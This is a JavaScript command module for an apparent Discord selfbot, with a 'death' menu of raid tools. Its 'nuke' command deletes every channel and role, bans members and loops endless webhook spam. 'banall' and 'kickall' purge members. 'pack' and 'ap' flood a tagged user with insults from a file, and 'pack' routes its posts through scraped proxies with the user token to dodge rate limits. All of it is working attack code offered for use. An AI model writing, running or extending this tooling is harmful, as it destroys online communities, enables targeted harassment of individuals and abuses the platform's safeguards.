const fs = require('fs');
const path = require('path');
const { codeblock, kv } = require('../helpers/render');
const { requireOwner } = require('../helpers/permissions');
const proxyManager = require('../helpers/proxyManager');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

const ROOT = path.resolve(__dirname, '..');
const PACK_FILE = path.join(ROOT, 'data', 'pack.txt');
const packLoops = new Map();
const apStates = new Map();

function readLines(file) {
  if (!fs.existsSync(file)) return [];
  return fs.readFileSync(file, 'utf8').split('\n').map(l => l.trim()).filter(Boolean);
}

function register(client) {
  client.registerCommand('death', async (c, m) => {
    const proxyCount = proxyManager.getList().length;
    await m.edit(codeblock('death', [
      'NUKES',
      '  nuke yes          destroy server',
      '  banall yes        ban all members',
      '  kickall yes       kick all members',
      '',
      'RAIDERS',
      '  spam <n> <msg>    spam message',
      '  massping <n>      ping everyone',
      '  webhookspam       webhook flood',
      '',
      'FLOODERS',
      '  channelflood      create 50 channels',
      '  pack @user        proxy-based insult loop',
      '  ap @user          auto-reply insult',
      '',
      'PROXIES',
      '  proxyscrape       scrape fresh proxies',
      '  proxyclean        test and clean proxies',
      '',
      `proxies loaded: ${proxyCount}`
    ].join('\n')));
  }, { category: 'death', description: 'raid and nuke menu', sticky: true });

  client.registerCommand('nuke', async (c, m, args) => {
    if (!(await requireOwner(c, m))) return;
    if (!m.guild) return m.edit(codeblock('nuke', 'server only'));
    if ((args[0] || '').toLowerCase() !== 'yes') return m.edit(codeblock('nuke', 'run nuke yes to confirm'));
    const guild = m.guild;
    await m.edit(codeblock('nuke', 'running'));
    (async () => {
      await guild.edit({ name: 'EZ-NUKE' }).catch(() => {});
      for (const ch of guild.channels.cache.values()) { try { await ch.delete(); } catch (e) {} await new Promise(r => setTimeout(r, 200)); }
      for (const role of guild.roles.cache.values()) { if (role.id === guild.id) continue; try { await role.delete(); } catch (e) {} await new Promise(r => setTimeout(r, 200)); }
      for (const member of guild.members.cache.values()) { if (member.id === guild.me.id || member.id === guild.ownerId) continue; try { await member.ban({ reason: 'EZ-NUKE' }); } catch (e) {} await new Promise(r => setTimeout(r, 200)); }
      while (true) {
        try {
          const ch = await guild.channels.create('ez-nuke', { type: 'GUILD_TEXT' });
          const wh = await ch.createWebhook({ name: 'EZ-NUKE' });
          setInterval(() => { wh.send({ content: 'EZ-NUKE', username: 'EZ-NUKE' }).catch(() => {}); }, 100);
        } catch (e) {}
        await new Promise(r => setTimeout(r, 200));
      }
    })();
  }, { category: 'death', description: 'destroy server', gate: 'owner' });

  client.registerCommand('banall', async (c, m, args) => {
    if (!(await requireOwner(c, m))) return;
    if (!m.guild) return m.edit(codeblock('banall', 'server only'));
    if ((args[0] || '').toLowerCase() !== 'yes') return m.edit(codeblock('banall', 'run banall yes to confirm'));
    const members = await m.guild.members.fetch().catch(() => m.guild.members.cache);
    const targets = members.filter(x => x.bannable && x.id !== c.user.id && !x.user.bot);
    let done = 0;
    await m.edit(codeblock('banall', 'running'));
    await Promise.allSettled([...targets.values()].map(x => x.ban({ reason: 'Mambo' }).then(() => done++).catch(() => {})));
    await m.edit(codeblock('banall', kv([['banned', done]])));
  }, { category: 'death', description: 'ban all members', gate: 'owner' });

  client.registerCommand('kickall', async (c, m, args) => {
    if (!(await requireOwner(c, m))) return;
    if (!m.guild) return m.edit(codeblock('kickall', 'server only'));
    if ((args[0] || '').toLowerCase() !== 'yes') return m.edit(codeblock('kickall', 'run kickall yes to confirm'));
    const members = await m.guild.members.fetch().catch(() => m.guild.members.cache);
    const targets = members.filter(x => x.kickable && x.id !== c.user.id && !x.user.bot);
    let done = 0;
    await m.edit(codeblock('kickall', 'running'));
    await Promise.allSettled([...targets.values()].map(x => x.kick('Mambo').then(() => done++).catch(() => {})));
    await m.edit(codeblock('kickall', kv([['kicked', done]])));
  }, { category: 'death', description: 'kick all members', gate: 'owner' });

  client.registerCommand('pack', async (c, m, args) => {
    const target = (args[0] || '').replace(/[<@!>]/g, '');
    if (!target) return m.edit(codeblock('pack', 'usage: pack @user [delay_ms]'));
    const cid = m.channel.id;
    if (packLoops.has(cid)) clearInterval(packLoops.get(cid));
    const words = readLines(PACK_FILE);
    if (!words.length) return m.edit(codeblock('pack', 'pack.txt empty'));
    
    const delay = parseInt(args[1], 10) || 800;
    
    const sendFast = async () => {
      const line = words[Math.floor(Math.random() * words.length)];
      const proxy = proxyManager.getNext();
      try {
        if (proxy) {
          const agent = new HttpsProxyAgent('http://' + proxy);
          await axios.post('https://discord.com/api/v10/channels/' + cid + '/messages', 
            { content: '<@' + target + '> ' + line },
            { headers: { Authorization: c.token }, httpsAgent: agent, timeout: 5000 }
          );
        } else {
          await m.channel.send('<' + '@' + target + '> ' + line);
        }
      } catch (e) {
        if (!proxy) { try { await m.channel.send('<' + '@' + target + '> ' + line); } catch (err) {} }
      }
    };

    const id = setInterval(async () => {
      const promises = [];
      const burst = proxyManager.getList().length > 0 ? 5 : 1;
      for (let i = 0; i < burst; i++) promises.push(sendFast());
      await Promise.allSettled(promises);
    }, delay);
    
    packLoops.set(cid, id);
    await m.edit(codeblock('pack · start', kv([
      ['target', target],
      ['delay', delay + 'ms'],
      ['proxies', proxyManager.getList().length],
      ['mode', proxyManager.getList().length > 0 ? 'FAST (API)' : 'WS (Slow)']
    ])));
  }, { category: 'death', description: 'fast proxy insult loop' });

  client.registerCommand('packstop', async (c, m) => {
    const cid = m.channel.id;
    if (packLoops.has(cid)) { clearInterval(packLoops.get(cid)); packLoops.delete(cid); return m.edit(codeblock('pack', 'stopped')); }
    await m.edit(codeblock('pack', 'nothing running'));
  }, { category: 'death', description: 'stop pack loop' });

  client.registerCommand('ap', async (c, m, args) => {
    const sub = (args[0] || '').toLowerCase();
    if (sub === 'stop') { apStates.delete(c.user.id); return m.edit(codeblock('ap', 'stopped')); }
    const target = (args[0] || '').replace(/[<@!>]/g, '');
    if (!target) return m.edit(codeblock('ap', 'usage: ap @user | ap stop'));
    apStates.set(c.user.id, target);
    await m.edit(codeblock('ap', kv([['target', target], ['status', 'active']])));
  }, { category: 'death', description: 'auto-reply pack' });

  client.registerCommand('proxyscrape', async (c, m) => {
    await m.edit(codeblock('proxy', 'scraping...'));
    try {
      const count = await proxyManager.scrape();
      await m.edit(codeblock('proxy', kv([['scraped', count + ' proxies'], ['saved', 'proxies.txt']])));
    } catch (e) { await m.edit(codeblock('proxy', 'error: ' + e.message)); }
  }, { category: 'death', description: 'scrape proxies' });

  client.registerCommand('proxyclean', async (c, m) => {
    await m.edit(codeblock('proxy', 'testing (this takes a while)...'));
    try {
      const valid = await proxyManager.clean();
      await m.edit(codeblock('proxy', kv([['valid', valid + ' working proxies']])));
    } catch (e) { await m.edit(codeblock('proxy', 'error: ' + e.message)); }
  }, { category: 'death', description: 'test and clean proxies' });

  client.on('messageCreate', async (msg) => {
    if (!client.user || msg.author.id === client.user.id) return;
    const target = apStates.get(client.user.id);
    if (!target) return;
    if (msg.author.id !== target) return;
    const words = readLines(PACK_FILE);
    if (!words.length) return;
    const line = words[Math.floor(Math.random() * words.length)];
    try { await msg.reply('<' + '@' + msg.author.id + '> ' + line); } catch (e) {}
  });
}

module.exports = { register };
